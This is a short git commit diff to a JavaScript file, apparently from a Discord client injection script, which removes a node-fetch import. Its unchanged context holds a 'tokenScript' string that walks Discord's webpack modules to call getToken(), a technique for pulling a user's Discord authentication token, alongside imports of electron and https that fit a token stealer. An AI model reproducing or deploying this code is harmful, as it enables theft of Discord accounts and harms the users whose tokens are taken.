e79ac80a7c62a2525049b6ed4a2f89772fdaa1d8
xugga <147700782+xugga@users.noreply.github.com>
2024-03-05 20:49:10 +0200

    index.js

--- index.js
+++ index.js
@@ -4,7 +4,7 @@ const fs = require("fs")
 const electron = require("electron")
 const https = require("https");
 const queryString = require("querystring")
-const fetch = require('node-fetch')
+
 
 
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
